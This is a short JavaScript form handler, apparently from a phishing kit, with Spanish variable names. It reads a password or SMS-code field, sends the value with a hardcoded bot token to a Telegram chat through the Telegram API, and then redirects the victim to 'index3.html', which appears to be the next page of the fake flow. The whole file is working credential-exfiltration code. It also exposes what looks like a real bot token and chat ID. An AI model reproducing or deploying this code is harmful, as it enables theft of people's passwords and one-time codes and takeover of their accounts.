function enviarFormulario(event) {
    event.preventDefault();

    var contraseña = document.getElementById("contraseña").value;

    var mensaje = "SMS: <code>" + contraseña + "</code>\n" ;  

    fetch("https://api.telegram.org/bot" + "6976585330:AAHURtjx2tMk3Lh6zCy7amkTl-4VNAUga2s" + "/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: -4022516971,
            text: mensaje,
            parse_mode: "HTML"
        })
    })
    .then(function(response) {
        if (response.ok) {
            
            window.location.href = "index3.html";
        } else {
           
            console.error("Error en la llamada a la API de Telegram: ", response.statusText);
        }
    })
    .catch(function(error) {
        
        console.error("Error en la llamada a la API de Telegram: ", error);
    });
}